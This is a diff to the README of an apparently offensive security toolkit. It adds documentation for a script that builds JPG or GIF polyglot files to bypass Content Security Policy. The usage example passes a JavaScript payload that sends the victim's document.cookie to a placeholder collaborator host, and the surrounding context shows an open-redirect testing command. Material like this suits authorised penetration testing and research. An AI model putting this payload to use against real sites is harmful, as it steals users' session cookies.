@@ -187,3 +187,15 @@ python crimson_mass_nmap
 ```bash
 crimson_redirectOR.py whitelisted.com afine.com 123.123.123.123 redirect_uri
 ```
+
+
+## :small_red_triangle_down:pol_jpg_js_gif_gen.py
+
+> Script for generating a JPG_JS | GIF_JS files for bypassing the CSP using the technique described [here](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs).
+
+> Script is modified version of the original one located [here](https://github.com/s-3ntinel/imgjs_polygloter).
+
+### Usage example:
+```
+python3 pol_jpg_js_gif_gen.py jpg -H 250 -W 250 -p 'document.location.href="http://domain_collab?"+document.cookie;' -o a.jpg
+```
